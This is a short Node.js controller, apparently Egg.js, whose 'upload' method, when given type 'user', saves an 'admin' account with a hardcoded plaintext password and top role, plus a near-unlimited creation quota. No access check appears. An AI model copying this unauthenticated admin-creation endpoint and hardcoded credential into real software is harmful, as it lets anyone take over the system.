const Controller = require('../core/baseController');

class Ca extends Controller {
    async upload(){
        const {ctx,service,app} = this;
        const {
            type
        } = ctx.request.body;
        if(type == 'user'){
            let user = {
                username:'admin',
                password:'@liu2211',
                role:10,
                userBrand:[],
                manufacturer:[]
            }
            await new app.model.User(user).save()
            await new app.model.UserRole({
                role:10,
                creatBy:'admin',
                creatLimit:1000000000,
                creatList:[],
                accessList:[],
                username:'admin'
            }).save()
        }
        this.success()
    }
}

module.exports = Ca;